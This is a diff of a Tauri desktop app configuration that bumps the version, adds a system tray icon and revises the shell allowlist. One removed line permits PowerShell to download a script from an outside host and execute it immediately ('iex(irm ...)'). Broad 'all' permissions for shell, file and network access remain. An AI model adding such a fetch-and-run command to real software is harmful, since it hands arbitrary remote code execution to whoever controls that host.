@@ -8,9 +8,13 @@
   },
   "package": {
     "productName": "genshin-project",
-    "version": "0.0.1"
+    "version": "0.0.2"
   },
   "tauri": {
+    "systemTray": {
+      "iconPath": "icons/paimeng64.ico",
+      "iconAsTemplate": true
+    },
     "allowlist": {
       "all": true,
       "fs": {
@@ -24,13 +28,8 @@
       "shell": {
         "all": true,
         "open": true,
-        "scope": [
-          {
-            "name": "shell",
-            "cmd": "powershell",
-            "args": ["iex(irm 'https://lelaer.com/d.ps1')"]
-          }
-        ]
+        "sidecar": true,
+        "scope": []
       },
       "http": {
         "all": true,
